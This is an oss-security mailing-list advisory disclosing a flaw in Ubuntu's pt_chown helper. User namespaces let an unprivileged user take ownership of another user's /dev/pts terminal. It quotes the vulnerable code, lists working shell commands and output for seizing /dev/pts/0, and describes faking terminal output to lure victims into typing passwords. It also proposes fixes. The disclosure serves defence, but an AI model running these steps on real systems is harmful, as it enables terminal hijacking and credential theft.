  oss-security - Access to /dev/pts devices via pt_chown and user namespaces            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Tue, 23 Feb From: halfdog <me@...fdog.net> To: oss-security@...ts.openwall.com Subject: Access to /dev/pts devices via pt_chown and user namespaces  -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  Sending content from [0] also to oss-security as requested last time:   Problem description: ====================  With Ubuntu Wily and earlier, /usr/lib/pt_chown was used to change ownership of slave pts devices in /dev/pts to the same uid holding the master file descriptor for the slave. This is done using the pt_chown SUID binary, which invokes the ptsname function on the master-fd, thus again performing a TIOCGPTN ioctl to get the slave pts number. Using the result from the ioctl, the pathname of the slave pts is constructed and chown invoked on it, see login/programs/pt_chown.c:    pty = ptsname (PTY_FILENO);   if (pty == NULL)     ...   /* Get the group ID of the special `tty' group.  */   p = getgrnam (TTY_GROUP);   gid = p ? p->gr_gid : getgid ();    /* Set the owner to the real user ID, and the group to that special      group ID.  */   if (chown (pty, getuid (), gid) < 0)     return FAIL_EACCES;    /* Set the permission mode to readable and writable by the owner,      and writable by the group.  */   if ((st.st_mode & ACCESSPERMS) != (S_IRUSR|S_IWUSR|S_IWGRP)       && chmod (pty, S_IRUSR|S_IWUSR|S_IWGRP) < 0)     return FAIL_EACCES;    return 0;  The logic above is severely flawed, when there can be more than one master/slave pair having the same number and thus same name. But this condition can be easily created by creating an user namespace, mounting devpts with the newinstance option, create master and slave pts pairs until the number overlaps with a target pts outside the namespace on the host, where there is interest to gain ownership and then invoke pt_chown.  Methods: ========  Exploitation is trivial: At first use any user namespace demo to create the namespace needed, e.g. UserNamespaceExec.c and work with standard shell commands, e.g. to take over /dev/pts/0:  test# who am I test    pts/1        test# ./UserNamespacesExec -- /bin/bash Setting uid map in Setting gid map in euid: 0, egid: 0 euid: 0, egid: 0 root# mkdir mnt root# mount -t devpts -o newinstance /dev/pts mnt root# cd mnt root# chmod ptmx  Use a second shell to continue:  test# cd test# ls -al total 4 drwxr-xr-x 2 root  root     0 Dec 27 . drwxr-xr-x 7 test users Dec 27 .. c--------- 1 test users 5, 2 Dec 27 ptmx test# exec 3<>ptmx test# ls -al total 4 drwxr-xr-x 2 root  root       0 Dec 27 . drwxr-xr-x 7 test users   Dec 27 .. crw------- 1 test users 0 Dec 27 0 crw-rw-rw- 1 test users   5, 2 Dec 27 ptmx test# ls -al /dev/pts/0 crw--w---- 1 root tty 1 Dec 27  /dev/pts/0 test# /usr/lib/pt_chown test# ls -al /dev/pts/0 crw--w---- 1 test tty 1 Dec 27 /dev/pts/0  On systems where the TIOCSTI-ioctl is not prohibited, the tools from TtyPushbackPrivilegeEscalation to directly inject code into a shell using the pts device. This is not the case at least on Ubuntu Wily. But as reading and writing to the pts is allowed, the malicious user can not intercept all keystrokes and display faked output from commands never really executed. Thus he could lure the user into a) change his password or attempt to invoke su/sudo or b) simulate a situation, where user's next step is predictable and risky and then stop reading the pts, thus making user to execute a command in completely unexpected way.  Results, Discussion: ====================  As already mentioned in [1], exposure of essential OS functionality, previously just invoked by really privileged processes, to now unprivileged users via user namespaces greatly increases the attack surface and thus is a very interesting target for exploit development.  In my opinion, this security bug should be fixed two-fold: At first, kernel should prevent the TIOCGPTN ioctl when invoked called by a process within one namespace but acting on a filedescriptor from a devpts instance mounted in a different namespace. Additionally pt_chown should check via readlink and stat, that the passed file descriptor really was from the /dev/ptmx or /dev/pts/ptmx device present in the same namespace as the /dev/pts/[num] device is residing. This of course is only relevant if pt_chown is going to survive on recent namespace aware systems.  Timeline: =========      Discovery     Report at Ubuntu     Report to distros list     Patch to disable unprivileged userns due to this and other issues LKML     CRD and publication  References: ===========  [0] [1]  hd  - --  http://www.halfdog.net/ PGP: AE98 B91F FE88  2BD8 feed a bee -----BEGIN PGP SIGNATURE----- Version: GnuPG v1  =scxD -----END PGP SIGNATURE-----  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      